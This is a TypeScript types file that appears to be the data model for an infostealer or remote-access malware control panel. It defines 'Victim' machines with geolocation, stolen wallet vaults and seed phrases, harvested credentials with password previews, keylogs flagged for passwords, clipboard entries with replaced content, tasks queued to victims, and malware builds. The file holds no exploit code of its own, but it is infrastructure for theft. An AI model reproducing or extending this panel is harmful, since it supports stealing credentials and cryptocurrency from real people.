export type Role = 'admin' | 'operator' | 'viewer';

export type Operator = { id: string; email: string; role: Role; totpEnabled: boolean; lastLoginAt: string | null };

export type Victim = {
  id: string;
  hostname: string;
  username: string;
  os: string;
  osVersion: string;
  arch: string;
  country: string | null;
  countryCode: string | null;
  city: string | null;
  lat: number | null;
  lon: number | null;
  tags: string[];
  status: 'online' | 'stale' | 'offline' | 'revoked';
  profile: 'lite' | 'full';
  agentVersion: string;
  contractVersion?: number;
  identityState?: 'confirmed' | 'unverified' | 'grace' | 'revoked' | string;
  keyEpoch?: number;
  /** Declared ∩ supported. A v2 action is painted only if present. */
  capabilities?: string[];
  health?: string | null;
  ip: string | null;
  firstSeenAt: string;
  lastHeartbeatAt: string;
  lastAgentMessageAt?: string;
  revokedAt?: string | null;
  online: boolean;
  /** Live control socket, stricter than the heartbeat-derived `online`. */
  socket?: boolean;
  wallets?: number;
  artifacts?: number;
  build?: { id: string; name: string; version: string; buildId: string };
  discord?: { id: string; channelId: string; missingAt: string | null } | null;
  discordChannel?: string | null;
  discordMissingAt?: string | null;
  discordIgnored?: boolean;
  _count?: Record<string, number>;
  balances?: number;
};

export type Wallet = {
  id: string;
  kind: string;
  targetId: string;
  label?: string | null;
  source?: string | null;
  path: string;
  state: 'found' | 'decrypted' | 'locked' | 'no_vault' | 'unsupported' | 'corrupt' | 'failed';
  decryptState: string;
  decryptError?: string | null;
  reason: string | null;
  address: string | null;
  balance: string | null;
  createdAt: string;
  lastSeenAt?: string;
  secretCount?: number;
  artifactId: string | null;
};

export type VaultSecret = {
  id: string;
  kind: string;
  words: number | null;
  confidence: number | null;
  preview: string;
  available: boolean;
  updatedAt: string;
  firstSeenAt?: string;
};

export type VaultWallet = Wallet & { secrets: VaultSecret[] };

export type VaultGroup = {
  targetId: string;
  label: string;
  kind: string;
  state: Wallet['state'];
  address: string | null;
  balance: string | null;
  balanceValue?: number;
  seedFile?: boolean;
  secretKinds?: string[];
  lastSeenAt: string;
  wallets: VaultWallet[];
};

export type VaultSecretRow = {
  id: string;
  kind: string;
  preview: string;
  words: number | null;
  confidence: number | null;
  source: string | null;
  updatedAt: string;
  wallet: { id: string; targetId: string; kind: string; path: string; state: string };
  victim: { id: string; hostname: string };
};

export type VaultResponse = {
  victim: { id: string; hostname: string };
  groups: VaultGroup[];
  counters: { wallets: number; targets: number; seeds: number; keys: number; passwords: number; credentials: number; balances: number };
  lastScan: { name: string; status: string; createdAt: string; finishedAt: string | null; error: string | null } | null;
};

export type Credential = {
  id: string;
  victimId: string;
  targetId: string;
  kind: string;
  path: string;
  url: string | null;
  username: string;
  state: string;
  reason: string | null;
  firstSeenAt: string;
  updatedAt: string;
  hasPassword?: boolean;
  passwordPreview?: string;
  victim?: { id: string; hostname: string };
};

export type Task = {
  id: string;
  victimId: string;
  name: string;
  params: Record<string, unknown>;
  status: 'queued' | 'running' | 'done' | 'error' | 'cancelled' | 'expired' | 'unknown';
  priority: number;
  timeoutSec: number;
  attempts: number;
  result: Record<string, unknown> | null;
  error: string | null;
  createdAt: string;
  finishedAt: string | null;
  victim?: { id: string; hostname: string; os: string };
  createdBy?: { email: string } | null;
};

export type ClipboardEntry = {
  id: string;
  ts: string;
  window: string;
  process: string;
  content: string;
  kind: string;
  replaced: string | null;
  count?: number;
};

export type Keylog = { id: string; ts: string; process: string; title: string; text: string; password: boolean; count?: number };

export type TimelineEntry = {
  id: string;
  victimId: string;
  ts: string;
  origin: 'keystroke' | 'clipboard';
  process: string;
  title: string;
  content: string;
  kind: string;
  patterns: string[];
  count: number;
};

export type WalletDetection = {
  id: string;
  victimId: string;
  provider: string;
  kind: string;
  process: string;
  window: string;
  url: string | null;
  pid: number | null;
  firstSeenAt: string;
  lastSeenAt: string;
  closedAt: string | null;
  count: number;
};

export type EventRow = { id: string; kind: string; data: Record<string, unknown>; legacy: string; createdAt: string; victim?: { id: string; hostname: string }; readAt: string | null };

export type Notification = { id: string; kind: string; title: string; body: string; link: string | null; readAt: string | null; createdAt: string };

export type Build = {
  id: string;
  name: string;
  version: string;
  profile: 'lite' | 'full';
  buildId: string;
  token: string;
  universal: boolean;
  status: 'draft' | 'ready' | 'revoked';
  jarPath: string | null;
  createdBy: string | null;
  victims: number;
  createdAt: string;
  revokedAt: string | null;
};

export type Artifact = {
  id: string;
  module: string;
  bytes: number;
  createdAt: string;
  files: Array<{ path: string; size: number; kind: string }>;
};

export type AuditRow = {
  id: string;
  action: string;
  entity: string;
  entityId: string | null;
  ip: string | null;
  data: Record<string, unknown>;
  createdAt: string;
  operator: { email: string } | null;
};

export type Dashboard = {
  counters: { total: number; online: number; wallets: number; balances: number; artifacts: number; queued: number; failures: number };
  byOs: Array<{ os: string; count: number }>;
  byCountry: Array<{ country: string; count: number }>;
};

export type MapPoint = { id: string; hostname: string; os: string; country: string | null; city: string | null; lat: number; lon: number; online: boolean };

export type Page<T> = { items: T[]; next: string | null };
